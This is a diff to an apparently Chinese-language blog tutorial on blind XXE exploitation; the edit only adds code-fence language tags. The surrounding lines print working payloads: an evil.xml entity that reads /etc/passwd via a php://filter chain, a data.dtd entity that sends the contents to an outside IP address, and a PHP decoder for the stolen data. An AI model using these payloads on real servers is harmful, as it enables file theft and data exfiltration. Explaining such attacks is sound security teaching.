@@ -75,7 +75,7 @@ categories:
 
 首先，我们先尝试读取目标服务器的`/etc/passwd`文件。evil.xml文件内容为：
 
-```
+```xml-dtd
 <?xml version="1.0"?> 
 <!DOCTYPE ANY [ 
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
@@ -88,7 +88,7 @@ categories:
 
 - 第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：
 
-  ```
+  ```xml-dtd
   <!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>">
   ```
 
@@ -117,7 +117,7 @@ categories:
 
 接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：
 
-```
+```php
 <?php 
 echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt");
 ?>
